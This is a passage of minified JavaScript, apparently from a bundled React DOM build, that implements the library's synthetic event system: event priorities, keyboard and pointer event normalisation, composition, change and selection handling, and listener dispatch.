                }
            }
            function Hn(e, n, t, r, a, i) {
                return null === e || e.nativeEvent !== i ? (e = {
                    blockedOn: n,
                    domEventName: t,
                    eventSystemFlags: r,
                    nativeEvent: i,
                    targetContainers: [a]
                },
                null !== n && (null !== (n = ga(n)) && Cn(n)),
                e) : (e.eventSystemFlags |= r,
                n = e.targetContainers,
                null !== a && -1 === n.indexOf(a) && n.push(a),
                e)
            }
            function Wn(e) {
                var n = ba(e.target);
                if (null !== n) {
                    var t = Se(n);
                    if (null !== t)
                        if (13 === (n = t.tag)) {
                            if (null !== (n = Ze(t)))
                                return e.blockedOn = n,
                                void zn(e.priority, (function() {
                                    En(t)
                                }
                                ))
                        } else if (3 === n && t.stateNode.current.memoizedState.isDehydrated)
                            return void (e.blockedOn = 3 === t.tag ? t.stateNode.containerInfo : null)
                }
                e.blockedOn = null
            }
            function Vn(e) {
                if (null !== e.blockedOn)
                    return !1;
                for (var n = e.targetContainers; 0 < n.length; ) {
                    var t = Jn(e.domEventName, e.eventSystemFlags, n[0], e.nativeEvent);
                    if (null !== t)
                        return null !== (n = ga(t)) && Cn(n),
                        e.blockedOn = t,
                        !1;
                    var r = new (t = e.nativeEvent).constructor(t.type,t);
                    xe = r,
                    t.target.dispatchEvent(r),
                    xe = null,
                    n.shift()
                }
                return !0
            }
            function kn(e, n, t) {
                Vn(e) && t.delete(n)
            }
            function Yn() {
                Pn = !1,
                null !== In && Vn(In) && (In = null),
                null !== Xn && Vn(Xn) && (Xn = null),
                null !== Ln && Vn(Ln) && (Ln = null),
                On.forEach(kn),
                Bn.forEach(kn)
            }
            function Sn(e, n) {
                e.blockedOn === n && (e.blockedOn = null,
                Pn || (Pn = !0,
                a.unstable_scheduleCallback(a.unstable_NormalPriority, Yn)))
            }
            function Zn(e) {
                function n(n) {
                    return Sn(n, e)
                }
                if (0 < Nn.length) {
                    Sn(Nn[0], e);
                    for (var t = 1; t < Nn.length; t++) {
                        var r = Nn[t];
                        r.blockedOn === e && (r.blockedOn = null)
                    }
                }
                for (null !== In && Sn(In, e),
                null !== Xn && Sn(Xn, e),
                null !== Ln && Sn(Ln, e),
                On.forEach(n),
                Bn.forEach(n),
                t = 0; t < Tn.length; t++)
                    (r = Tn[t]).blockedOn === e && (r.blockedOn = null);
                for (; 0 < Tn.length && null === (t = Tn[0]).blockedOn; )
                    Wn(t),
                    null === t.blockedOn && Tn.shift()
            }
            var Dn = x.ReactCurrentBatchConfig
              , Fn = !0;
            function Gn(e, n, t, r) {
                var a = xn
                  , i = Dn.transition;
                Dn.transition = null;
                try {
                    xn = 1,
                    qn(e, n, t, r)
                } finally {
                    xn = a,
                    Dn.transition = i
                }
            }
            function Qn(e, n, t, r) {
                var a = xn
                  , i = Dn.transition;
                Dn.transition = null;
                try {
                    xn = 4,
                    qn(e, n, t, r)
                } finally {
                    xn = a,
                    Dn.transition = i
                }
            }
            function qn(e, n, t, r) {
                if (Fn) {
                    var a = Jn(e, n, t, r);
                    if (null === a)
                        Dr(e, n, r, Un, t),
                        Mn(e, r);
                    else if (function(e, n, t, r, a) {
                        switch (n) {
                        case "focusin":
                            return In = Hn(In, e, n, t, r, a),
                            !0;
                        case "dragenter":
                            return Xn = Hn(Xn, e, n, t, r, a),
                            !0;
                        case "mouseover":
                            return Ln = Hn(Ln, e, n, t, r, a),
                            !0;
                        case "pointerover":
                            var i = a.pointerId;
                            return On.set(i, Hn(On.get(i) || null, e, n, t, r, a)),
                            !0;
                        case "gotpointercapture":
                            return i = a.pointerId,
                            Bn.set(i, Hn(Bn.get(i) || null, e, n, t, r, a)),
                            !0
                        }
                        return !1
                    }(a, e, n, t, r))
                        r.stopPropagation();
                    else if (Mn(e, r),
                    4 & n && -1 < Rn.indexOf(e)) {
                        for (; null !== a; ) {
                            var i = ga(a);
                            if (null !== i && yn(i),
                            null === (i = Jn(e, n, t, r)) && Dr(e, n, r, Un, t),
                            i === a)
                                break;
                            a = i
                        }
                        null !== a && r.stopPropagation()
                    } else
                        Dr(e, n, r, null, t)
                }
            }
            var Un = null;
            function Jn(e, n, t, r) {
                if (Un = null,
                null !== (e = ba(e = we(r))))
                    if (null === (n = Se(e)))
                        e = null;
                    else if (13 === (t = n.tag)) {
                        if (null !== (e = Ze(n)))
                            return e;
                        e = null
                    } else if (3 === t) {
                        if (n.stateNode.current.memoizedState.isDehydrated)
                            return 3 === n.tag ? n.stateNode.containerInfo : null;
                        e = null
                    } else
                        n !== e && (e = null);
                return Un = e,
                null
            }
            function Kn(e) {
                switch (e) {
                case "cancel":
                case "click":
                case "close":
                case "contextmenu":
                case "copy":
                case "cut":
                case "auxclick":
                case "dblclick":
                case "dragend":
                case "dragstart":
                case "drop":
                case "focusin":
                case "focusout":
                case "input":
                case "invalid":
                case "keydown":
                case "keypress":
                case "keyup":
                case "mousedown":
                case "mouseup":
                case "paste":
                case "pause":
                case "play":
                case "pointercancel":
                case "pointerdown":
                case "pointerup":
                case "ratechange":
                case "reset":
                case "resize":
                case "seeked":
                case "submit":
                case "touchcancel":
                case "touchend":
                case "touchstart":
                case "volumechange":
                case "change":
                case "selectionchange":
                case "textInput":
                case "compositionstart":
                case "compositionend":
                case "compositionupdate":
                case "beforeblur":
                case "afterblur":
                case "beforeinput":
                case "blur":
                case "fullscreenchange":
                case "focus":
                case "hashchange":
                case "popstate":
                case "select":
                case "selectstart":
                    return 1;
                case "drag":
                case "dragenter":
                case "dragexit":
                case "dragleave":
                case "dragover":
                case "mousemove":
                case "mouseout":
                case "mouseover":
                case "pointermove":
                case "pointerout":
                case "pointerover":
                case "scroll":
                case "toggle":
                case "touchmove":
                case "wheel":
                case "mouseenter":
                case "mouseleave":
                case "pointerenter":
                case "pointerleave":
                    return 4;
                case "message":
                    switch (_e()) {
                    case $e:
                        return 1;
                    case en:
                        return 4;
                    case nn:
                    case tn:
                        return 16;
                    case rn:
                        return 536870912;
                    default:
                        return 16
                    }
                default:
                    return 16
                }
            }
            var _n = null
              , $n = null
              , et = null;
            function nt() {
                if (et)
                    return et;
                var e, n, t = $n, r = t.length, a = "value"in _n ? _n.value : _n.textContent, i = a.length;
                for (e = 0; e < r && t[e] === a[e]; e++)
                    ;
                var l = r - e;
                for (n = 1; n <= l && t[r - n] === a[i - n]; n++)
                    ;
                return et = a.slice(e, 1 < n ? 1 - n : void 0)
            }
            function tt(e) {
                var n = e.keyCode;
                return "charCode"in e ? 0 === (e = e.charCode) && 13 === n && (e = 13) : e = n,
                10 === e && (e = 13),
                32 <= e || 13 === e ? e : 0
            }
            function rt() {
                return !0
            }
            function at() {
                return !1
            }
            function it(e) {
                function n(n, t, r, a, i) {
                    for (var l in this._reactName = n,
                    this._targetInst = r,
                    this.type = t,
                    this.nativeEvent = a,
                    this.target = i,
                    this.currentTarget = null,
                    e)
                        e.hasOwnProperty(l) && (n = e[l],
                        this[l] = n ? n(a) : a[l]);
                    return this.isDefaultPrevented = (null != a.defaultPrevented ? a.defaultPrevented : !1 === a.returnValue) ? rt : at,
                    this.isPropagationStopped = at,
                    this
                }
                return H(n.prototype, {
                    preventDefault: function() {
                        this.defaultPrevented = !0;
                        var e = this.nativeEvent;
                        e && (e.preventDefault ? e.preventDefault() : "unknown" !== typeof e.returnValue && (e.returnValue = !1),
                        this.isDefaultPrevented = rt)
                    },
                    stopPropagation: function() {
                        var e = this.nativeEvent;
                        e && (e.stopPropagation ? e.stopPropagation() : "unknown" !== typeof e.cancelBubble && (e.cancelBubble = !0),
                        this.isPropagationStopped = rt)
                    },
                    persist: function() {},
                    isPersistent: rt
                }),
                n
            }
            var lt, ot, st, ut = {
                eventPhase: 0,
                bubbles: 0,
                cancelable: 0,
                timeStamp: function(e) {
                    return e.timeStamp || Date.now()
                },
                defaultPrevented: 0,
                isTrusted: 0
            }, ct = it(ut), At = H({}, ut, {
                view: 0,
                detail: 0
            }), dt = it(At), ft = H({}, At, {
                screenX: 0,
                screenY: 0,
                clientX: 0,
                clientY: 0,
                pageX: 0,
                pageY: 0,
                ctrlKey: 0,
                shiftKey: 0,
                altKey: 0,
                metaKey: 0,
                getModifierState: jt,
                button: 0,
                buttons: 0,
                relatedTarget: function(e) {
                    return void 0 === e.relatedTarget ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
                },
                movementX: function(e) {
                    return "movementX"in e ? e.movementX : (e !== st && (st && "mousemove" === e.type ? (lt = e.screenX - st.screenX,
                    ot = e.screenY - st.screenY) : ot = lt = 0,
                    st = e),
                    lt)
                },
                movementY: function(e) {
                    return "movementY"in e ? e.movementY : ot
                }
            }), pt = it(ft), vt = it(H({}, ft, {
                dataTransfer: 0
            })), mt = it(H({}, At, {
                relatedTarget: 0
            })), ht = it(H({}, ut, {
                animationName: 0,
                elapsedTime: 0,
                pseudoElement: 0
            })), bt = H({}, ut, {
                clipboardData: function(e) {
                    return "clipboardData"in e ? e.clipboardData : window.clipboardData
                }
            }), gt = it(bt), xt = it(H({}, ut, {
                data: 0
            })), wt = {
                Esc: "Escape",
                Spacebar: " ",
                Left: "ArrowLeft",
                Up: "ArrowUp",
                Right: "ArrowRight",
                Down: "ArrowDown",
                Del: "Delete",
                Win: "OS",
                Menu: "ContextMenu",
                Apps: "ContextMenu",
                Scroll: "ScrollLock",
                MozPrintableKey: "Unidentified"
            }, yt = {
                8: "Backspace",
                9: "Tab",
                12: "Clear",
                13: "Enter",
                16: "Shift",
                17: "Control",
                18: "Alt",
                19: "Pause",
                20: "CapsLock",
                27: "Escape",
                32: " ",
                33: "PageUp",
                34: "PageDown",
                35: "End",
                36: "Home",
                37: "ArrowLeft",
                38: "ArrowUp",
                39: "ArrowRight",
                40: "ArrowDown",
                45: "Insert",
                46: "Delete",
                112: "F1",
                113: "F2",
                114: "F3",
                115: "F4",
                116: "F5",
                117: "F6",
                118: "F7",
                119: "F8",
                120: "F9",
                121: "F10",
                122: "F11",
                123: "F12",
                144: "NumLock",
                145: "ScrollLock",
                224: "Meta"
            }, Ct = {
                Alt: "altKey",
                Control: "ctrlKey",
                Meta: "metaKey",
                Shift: "shiftKey"
            };
            function Et(e) {
                var n = this.nativeEvent;
                return n.getModifierState ? n.getModifierState(e) : !!(e = Ct[e]) && !!n[e]
            }
            function jt() {
                return Et
            }
            var zt = H({}, At, {
                key: function(e) {
                    if (e.key) {
                        var n = wt[e.key] || e.key;
                        if ("Unidentified" !== n)
                            return n
                    }
                    return "keypress" === e.type ? 13 === (e = tt(e)) ? "Enter" : String.fromCharCode(e) : "keydown" === e.type || "keyup" === e.type ? yt[e.keyCode] || "Unidentified" : ""
                },
                code: 0,
                location: 0,
                ctrlKey: 0,
                shiftKey: 0,
                altKey: 0,
                metaKey: 0,
                repeat: 0,
                locale: 0,
                getModifierState: jt,
                charCode: function(e) {
                    return "keypress" === e.type ? tt(e) : 0
                },
                keyCode: function(e) {
                    return "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
                },
                which: function(e) {
                    return "keypress" === e.type ? tt(e) : "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
                }
            })
              , Pt = it(zt)
              , Nt = it(H({}, ft, {
                pointerId: 0,
                width: 0,
                height: 0,
                pressure: 0,
                tangentialPressure: 0,
                tiltX: 0,
                tiltY: 0,
                twist: 0,
                pointerType: 0,
                isPrimary: 0
            }))
              , It = it(H({}, At, {
                touches: 0,
                targetTouches: 0,
                changedTouches: 0,
                altKey: 0,
                metaKey: 0,
                ctrlKey: 0,
                shiftKey: 0,
                getModifierState: jt
            }))
              , Xt = it(H({}, ut, {
                propertyName: 0,
                elapsedTime: 0,
                pseudoElement: 0
            }))
              , Lt = H({}, ft, {
                deltaX: function(e) {
                    return "deltaX"in e ? e.deltaX : "wheelDeltaX"in e ? -e.wheelDeltaX : 0
                },
                deltaY: function(e) {
                    return "deltaY"in e ? e.deltaY : "wheelDeltaY"in e ? -e.wheelDeltaY : "wheelDelta"in e ? -e.wheelDelta : 0
                },
                deltaZ: 0,
                deltaMode: 0
            })
              , Ot = it(Lt)
              , Bt = [9, 13, 27, 32]
              , Tt = c && "CompositionEvent"in window
              , Rt = null;
            c && "documentMode"in document && (Rt = document.documentMode);
            var Mt = c && "TextEvent"in window && !Rt
              , Ht = c && (!Tt || Rt && 8 < Rt && 11 >= Rt)
              , Wt = String.fromCharCode(32)
              , Vt = !1;
            function kt(e, n) {
                switch (e) {
                case "keyup":
                    return -1 !== Bt.indexOf(n.keyCode);
                case "keydown":
                    return 229 !== n.keyCode;
                case "keypress":
                case "mousedown":
                case "focusout":
                    return !0;
                default:
                    return !1
                }
            }
            function Yt(e) {
                return "object" === typeof (e = e.detail) && "data"in e ? e.data : null
            }
            var St = !1;
            var Zt = {
                color: !0,
                date: !0,
                datetime: !0,
                "datetime-local": !0,
                email: !0,
                month: !0,
                number: !0,
                password: !0,
                range: !0,
                search: !0,
                tel: !0,
                text: !0,
                time: !0,
                url: !0,
                week: !0
            };
            function Dt(e) {
                var n = e && e.nodeName && e.nodeName.toLowerCase();
                return "input" === n ? !!Zt[e.type] : "textarea" === n
            }
            function Ft(e, n, t, r) {
                ze(r),
                0 < (n = Gr(n, "onChange")).length && (t = new ct("onChange","change",null,t,r),
                e.push({
                    event: t,
                    listeners: n
                }))
            }
            var Gt = null
              , Qt = null;
            function qt(e) {
                Wr(e, 0)
            }
            function Ut(e) {
                if (Q(xa(e)))
                    return e
            }
            function Jt(e, n) {
                if ("change" === e)
                    return n
            }
            var Kt = !1;
            if (c) {
                var _t;
                if (c) {
                    var $t = "oninput"in document;
                    if (!$t) {
                        var er = document.createElement("div");
                        er.setAttribute("oninput", "return;"),
                        $t = "function" === typeof er.oninput
                    }
                    _t = $t
                } else
                    _t = !1;
                Kt = _t && (!document.documentMode || 9 < document.documentMode)
            }
            function nr() {
                Gt && (Gt.detachEvent("onpropertychange", tr),
                Qt = Gt = null)
            }
            function tr(e) {
                if ("value" === e.propertyName && Ut(Qt)) {
                    var n = [];
                    Ft(n, Qt, e, we(e)),
                    Le(qt, n)
                }
            }
            function rr(e, n, t) {
                "focusin" === e ? (nr(),
                Qt = t,
                (Gt = n).attachEvent("onpropertychange", tr)) : "focusout" === e && nr()
            }
            function ar(e) {
                if ("selectionchange" === e || "keyup" === e || "keydown" === e)
                    return Ut(Qt)
            }
            function ir(e, n) {
                if ("click" === e)
                    return Ut(n)
            }
            function lr(e, n) {
                if ("input" === e || "change" === e)
                    return Ut(n)
            }
            var or = "function" === typeof Object.is ? Object.is : function(e, n) {
                return e === n && (0 !== e || 1 / e === 1 / n) || e !== e && n !== n
            }
            ;
            function sr(e, n) {
                if (or(e, n))
                    return !0;
                if ("object" !== typeof e || null === e || "object" !== typeof n || null === n)
                    return !1;
                var t = Object.keys(e)
                  , r = Object.keys(n);
                if (t.length !== r.length)
                    return !1;
                for (r = 0; r < t.length; r++) {
                    var a = t[r];
                    if (!A.call(n, a) || !or(e[a], n[a]))
                        return !1
                }
                return !0
            }
            function ur(e) {
                for (; e && e.firstChild; )
                    e = e.firstChild;
                return e
            }
            function cr(e, n) {
                var t, r = ur(e);
                for (e = 0; r; ) {
                    if (3 === r.nodeType) {
                        if (t = e + r.textContent.length,
                        e <= n && t >= n)
                            return {
                                node: r,
                                offset: n - e
                            };
                        e = t
                    }
                    e: {
                        for (; r; ) {
                            if (r.nextSibling) {
                                r = r.nextSibling;
                                break e
                            }
                            r = r.parentNode
                        }
                        r = void 0
                    }
                    r = ur(r)
                }
            }
            function Ar(e, n) {
                return !(!e || !n) && (e === n || (!e || 3 !== e.nodeType) && (n && 3 === n.nodeType ? Ar(e, n.parentNode) : "contains"in e ? e.contains(n) : !!e.compareDocumentPosition && !!(16 & e.compareDocumentPosition(n))))
            }
            function dr() {
                for (var e = window, n = q(); n instanceof e.HTMLIFrameElement; ) {
                    try {
                        var t = "string" === typeof n.contentWindow.location.href
                    } catch (r) {
                        t = !1
                    }
                    if (!t)
                        break;
                    n = q((e = n.contentWindow).document)
                }
                return n
            }
            function fr(e) {
                var n = e && e.nodeName && e.nodeName.toLowerCase();
                return n && ("input" === n && ("text" === e.type || "search" === e.type || "tel" === e.type || "url" === e.type || "password" === e.type) || "textarea" === n || "true" === e.contentEditable)
            }
            function pr(e) {
                var n = dr()
                  , t = e.focusedElem
                  , r = e.selectionRange;
                if (n !== t && t && t.ownerDocument && Ar(t.ownerDocument.documentElement, t)) {
                    if (null !== r && fr(t))
                        if (n = r.start,
                        void 0 === (e = r.end) && (e = n),
                        "selectionStart"in t)
                            t.selectionStart = n,
                            t.selectionEnd = Math.min(e, t.value.length);
                        else if ((e = (n = t.ownerDocument || document) && n.defaultView || window).getSelection) {
                            e = e.getSelection();
                            var a = t.textContent.length
                              , i = Math.min(r.start, a);
                            r = void 0 === r.end ? i : Math.min(r.end, a),
                            !e.extend && i > r && (a = r,
                            r = i,
                            i = a),
                            a = cr(t, i);
                            var l = cr(t, r);
                            a && l && (1 !== e.rangeCount || e.anchorNode !== a.node || e.anchorOffset !== a.offset || e.focusNode !== l.node || e.focusOffset !== l.offset) && ((n = n.createRange()).setStart(a.node, a.offset),
                            e.removeAllRanges(),
                            i > r ? (e.addRange(n),
                            e.extend(l.node, l.offset)) : (n.setEnd(l.node, l.offset),
                            e.addRange(n)))
                        }
                    for (n = [],
                    e = t; e = e.parentNode; )
                        1 === e.nodeType && n.push({
                            element: e,
                            left: e.scrollLeft,
                            top: e.scrollTop
                        });
                    for ("function" === typeof t.focus && t.focus(),
                    t = 0; t < n.length; t++)
                        (e = n[t]).element.scrollLeft = e.left,
                        e.element.scrollTop = e.top
                }
            }
            var vr = c && "documentMode"in document && 11 >= document.documentMode
              , mr = null
              , hr = null
              , br = null
              , gr = !1;
            function xr(e, n, t) {
                var r = t.window === t ? t.document : 9 === t.nodeType ? t : t.ownerDocument;
                gr || null == mr || mr !== q(r) || ("selectionStart"in (r = mr) && fr(r) ? r = {
                    start: r.selectionStart,
                    end: r.selectionEnd
                } : r = {
                    anchorNode: (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection()).anchorNode,
                    anchorOffset: r.anchorOffset,
                    focusNode: r.focusNode,
                    focusOffset: r.focusOffset
                },
                br && sr(br, r) || (br = r,
                0 < (r = Gr(hr, "onSelect")).length && (n = new ct("onSelect","select",null,n,t),
                e.push({
                    event: n,
                    listeners: r
                }),
                n.target = mr)))
            }
            function wr(e, n) {
                var t = {};
                return t[e.toLowerCase()] = n.toLowerCase(),
                t["Webkit" + e] = "webkit" + n,
                t["Moz" + e] = "moz" + n,
                t
            }
            var yr = {
                animationend: wr("Animation", "AnimationEnd"),
                animationiteration: wr("Animation", "AnimationIteration"),
                animationstart: wr("Animation", "AnimationStart"),
                transitionend: wr("Transition", "TransitionEnd")
            }
              , Cr = {}
              , Er = {};
            function jr(e) {
                if (Cr[e])
                    return Cr[e];
                if (!yr[e])
                    return e;
                var n, t = yr[e];
                for (n in t)
                    if (t.hasOwnProperty(n) && n in Er)
                        return Cr[e] = t[n];
                return e
            }
            c && (Er = document.createElement("div").style,
            "AnimationEvent"in window || (delete yr.animationend.animation,
            delete yr.animationiteration.animation,
            delete yr.animationstart.animation),
            "TransitionEvent"in window || delete yr.transitionend.transition);
            var zr = jr("animationend")
              , Pr = jr("animationiteration")
              , Nr = jr("animationstart")
              , Ir = jr("transitionend")
              , Xr = new Map
              , Lr = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");
            function Or(e, n) {
                Xr.set(e, n),
                s(n, [e])
            }
            for (var Br = 0; Br < Lr.length; Br++) {
                var Tr = Lr[Br];
                Or(Tr.toLowerCase(), "on" + (Tr[0].toUpperCase() + Tr.slice(1)))
            }
            Or(zr, "onAnimationEnd"),
            Or(Pr, "onAnimationIteration"),
            Or(Nr, "onAnimationStart"),
            Or("dblclick", "onDoubleClick"),
            Or("focusin", "onFocus"),
            Or("focusout", "onBlur"),
            Or(Ir, "onTransitionEnd"),
            u("onMouseEnter", ["mouseout", "mouseover"]),
            u("onMouseLeave", ["mouseout", "mouseover"]),
            u("onPointerEnter", ["pointerout", "pointerover"]),
            u("onPointerLeave", ["pointerout", "pointerover"]),
            s("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")),
            s("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),
            s("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]),
            s("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")),
            s("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")),
            s("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
            var Rr = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" ")
              , Mr = new Set("cancel close invalid load scroll toggle".split(" ").concat(Rr));
            function Hr(e, n, t) {
                var r = e.type || "unknown-event";
                e.currentTarget = t,
                function(e, n, t, r, a, l, o, s, u) {
                    if (Ye.apply(this, arguments),
                    Me) {
                        if (!Me)
                            throw Error(i(198));
                        var c = He;
                        Me = !1,
                        He = null,
                        We || (We = !0,
                        Ve = c)
                    }
                }(r, n, void 0, e),
                e.currentTarget = null
            }
            function Wr(e, n) {
                n = 0 !== (4 & n);
                for (var t = 0; t < e.length; t++) {
                    var r = e[t]
                      , a = r.event;
                    r = r.listeners;
                    e: {
                        var i = void 0;
                        if (n)
                            for (var l = r.length - 1; 0 <= l; l--) {
                                var o = r[l]
                                  , s = o.instance
                                  , u = o.currentTarget;
                                if (o = o.listener,
                                s !== i && a.isPropagationStopped())
                                    break e;
                                Hr(a, o, u),
                                i = s
                            }
                        else
                            for (l = 0; l < r.length; l++) {
                                if (s = (o = r[l]).instance,
                                u = o.currentTarget,
                                o = o.listener,
                                s !== i && a.isPropagationStopped())
                                    break e;
                                Hr(a, o, u),
                                i = s
                            }
                    }
                }
                if (We)
                    throw e = Ve,
                    We = !1,
                    Ve = null,
                    e
            }
            function Vr(e, n) {
                var t = n[va];
                void 0 === t && (t = n[va] = new Set);
                var r = e + "__bubble";
                t.has(r) || (Zr(n, e, 2, !1),
                t.add(r))
            }
            function kr(e, n, t) {
                var r = 0;
                n && (r |= 4),
                Zr(t, e, r, n)
            }
            var Yr = "_reactListening" + Math.random().toString(36).slice(2);
            function Sr(e) {
                if (!e[Yr]) {
                    e[Yr] = !0,
                    l.forEach((function(n) {
                        "selectionchange" !== n && (Mr.has(n) || kr(n, !1, e),
                        kr(n, !0, e))
                    }
                    ));
                    var n = 9 === e.nodeType ? e : e.ownerDocument;
                    null === n || n[Yr] || (n[Yr] = !0,
                    kr("selectionchange", !1, n))
                }
            }
            function Zr(e, n, t, r) {
                switch (Kn(n)) {
                case 1:
                    var a = Gn;
                    break;
                case 4:
                    a = Qn;
                    break;
                default:
                    a = qn
                }
                t = a.bind(null, n, t, e),
                a = void 0,
                !Be || "touchstart" !== n && "touchmove" !== n && "wheel" !== n || (a = !0),
                r ? void 0 !== a ? e.addEventListener(n, t, {
                    capture: !0,
                    passive: a
                }) : e.addEventListener(n, t, !0) : void 0 !== a ? e.addEventListener(n, t, {
                    passive: a
                }) : e.addEventListener(n, t, !1)
            }
            function Dr(e, n, t, r, a) {
                var i = r;
                if (0 === (1 & n) && 0 === (2 & n) && null !== r)
                    e: for (; ; ) {
                        if (null === r)
                            return;
                        var l = r.tag;
                        if (3 === l || 4 === l) {
                            var o = r.stateNode.containerInfo;
                            if (o === a || 8 === o.nodeType && o.parentNode === a)
                                break;
                            if (4 === l)
                                for (l = r.return; null !== l; ) {
                                    var s = l.tag;
                                    if ((3 === s || 4 === s) && ((s = l.stateNode.containerInfo) === a || 8 === s.nodeType && s.parentNode === a))
                                        return;
                                    l = l.return
                                }
                            for (; null !== o; ) {
                                if (null === (l = ba(o)))
                                    return;
                                if (5 === (s = l.tag) || 6 === s) {
                                    r = i = l;
                                    continue e
                                }
                                o = o.parentNode
                            }
                        }
                        r = r.return
                    }
                Le((function() {
                    var r = i
                      , a = we(t)
                      , l = [];
                    e: {
                        var o = Xr.get(e);
                        if (void 0 !== o) {
                            var s = ct
                              , u = e;
                            switch (e) {
                            case "keypress":
                                if (0 === tt(t))
                                    break e;
                            case "keydown":
                            case "keyup":
                                s = Pt;
                                break;
                            case "focusin":
                                u = "focus",
                                s = mt;
                                break;
                            case "focusout":
                                u = "blur",
                                s = mt;
                                break;
                            case "beforeblur":
                            case "afterblur":
                                s = mt;
                                break;
                            case "click":
                                if (2 === t.button)
                                    break e;
                            case "auxclick":
                            case "dblclick":
                            case "mousedown":
                            case "mousemove":
                            case "mouseup":
                            case "mouseout":
                            case "mouseover":
                            case "contextmenu":
                                s = pt;
                                break;
                            case "drag":
                            case "dragend":
                            case "dragenter":
                            case "dragexit":
                            case "dragleave":
                            case "dragover":
                            case "dragstart":
                            case "drop":
                                s = vt;
                                break;
                            case "touchcancel":
                            case "touchend":
                            case "touchmove":
                            case "touchstart":
                                s = It;
                                break;
                            case zr:
                            case Pr:
                            case Nr:
                                s = ht;
                                break;
                            case Ir:
                                s = Xt;
                                break;
                            case "scroll":
                                s = dt;
                                break;
                            case "wheel":
                                s = Ot;
                                break;
                            case "copy":
                            case "cut":
                            case "paste":
                                s = gt;
                                break;
                            case "gotpointercapture":
                            case "lostpointercapture":
                            case "pointercancel":
                            case "pointerdown":
                            case "pointermove":
                            case "pointerout":
                            case "pointerover":
                            case "pointerup":
                                s = Nt
                            }
                            var c = 0 !== (4 & n)
                              , A = !c && "scroll" === e
                              , d = c ? null !== o ? o + "Capture" : null : o;
                            c = [];
                            for (var f, p = r; null !== p; ) {
                                var v = (f = p).stateNode;
                                if (5 === f.tag && null !== v && (f = v,
                                null !== d && (null != (v = Oe(p, d)) && c.push(Fr(p, v, f)))),
                                A)
                                    break;
                                p = p.return
                            }
                            0 < c.length && (o = new s(o,u,null,t,a),
                            l.push({
                                event: o,
                                listeners: c
                            }))
                        }
                    }
                    if (0 === (7 & n)) {
                        if (s = "mouseout" === e || "pointerout" === e,
                        (!(o = "mouseover" === e || "pointerover" === e) || t === xe || !(u = t.relatedTarget || t.fromElement) || !ba(u) && !u[pa]) && (s || o) && (o = a.window === a ? a : (o = a.ownerDocument) ? o.defaultView || o.parentWindow : window,
                        s ? (s = r,
                        null !== (u = (u = t.relatedTarget || t.toElement) ? ba(u) : null) && (u !== (A = Se(u)) || 5 !== u.tag && 6 !== u.tag) && (u = null)) : (s = null,
                        u = r),
                        s !== u)) {
                            if (c = pt,
                            v = "onMouseLeave",
                            d = "onMouseEnter",
                            p = "mouse",
                            "pointerout" !== e && "pointerover" !== e || (c = Nt,
                            v = "onPointerLeave",
                            d = "onPointerEnter",
                            p = "pointer"),
                            A = null == s ? o : xa(s),
                            f = null == u ? o : xa(u),
                            (o = new c(v,p + "leave",s,t,a)).target = A,
                            o.relatedTarget = f,
                            v = null,
                            ba(a) === r && ((c = new c(d,p + "enter",u,t,a)).target = f,
                            c.relatedTarget = A,
                            v = c),
                            A = v,
                            s && u)
                                e: {
                                    for (d = u,
                                    p = 0,
                                    f = c = s; f; f = Qr(f))
                                        p++;
                                    for (f = 0,
                                    v = d; v; v = Qr(v))
                                        f++;
                                    for (; 0 < p - f; )
                                        c = Qr(c),
                                        p--;
                                    for (; 0 < f - p; )
                                        d = Qr(d),
                                        f--;
                                    for (; p--; ) {
                                        if (c === d || null !== d && c === d.alternate)
                                            break e;
                                        c = Qr(c),
                                        d = Qr(d)
                                    }
                                    c = null
                                }
                            else
                                c = null;
                            null !== s && qr(l, o, s, c, !1),
                            null !== u && null !== A && qr(l, A, u, c, !0)
                        }
                        if ("select" === (s = (o = r ? xa(r) : window).nodeName && o.nodeName.toLowerCase()) || "input" === s && "file" === o.type)
                            var m = Jt;
                        else if (Dt(o))
                            if (Kt)
                                m = lr;
                            else {
                                m = ar;
                                var h = rr
                            }
                        else
                            (s = o.nodeName) && "input" === s.toLowerCase() && ("checkbox" === o.type || "radio" === o.type) && (m = ir);
                        switch (m && (m = m(e, r)) ? Ft(l, m, t, a) : (h && h(e, o, r),
                        "focusout" === e && (h = o._wrapperState) && h.controlled && "number" === o.type && ee(o, "number", o.value)),
                        h = r ? xa(r) : window,
                        e) {
                        case "focusin":
                            (Dt(h) || "true" === h.contentEditable) && (mr = h,
                            hr = r,
                            br = null);
                            break;
                        case "focusout":
                            br = hr = mr = null;
                            break;
                        case "mousedown":
                            gr = !0;
                            break;
                        case "contextmenu":
                        case "mouseup":
                        case "dragend":
                            gr = !1,
                            xr(l, t, a);
                            break;
                        case "selectionchange":
                            if (vr)
                                break;
                        case "keydown":
                        case "keyup":
                            xr(l, t, a)
                        }
                        var b;
                        if (Tt)
                            e: {
                                switch (e) {
                                case "compositionstart":
                                    var g = "onCompositionStart";
                                    break e;
                                case "compositionend":
                                    g = "onCompositionEnd";
                                    break e;
                                case "compositionupdate":
                                    g = "onCompositionUpdate";
                                    break e
                                }
                                g = void 0
                            }
                        else
                            St ? kt(e, t) && (g = "onCompositionEnd") : "keydown" === e && 229 === t.keyCode && (g = "onCompositionStart");
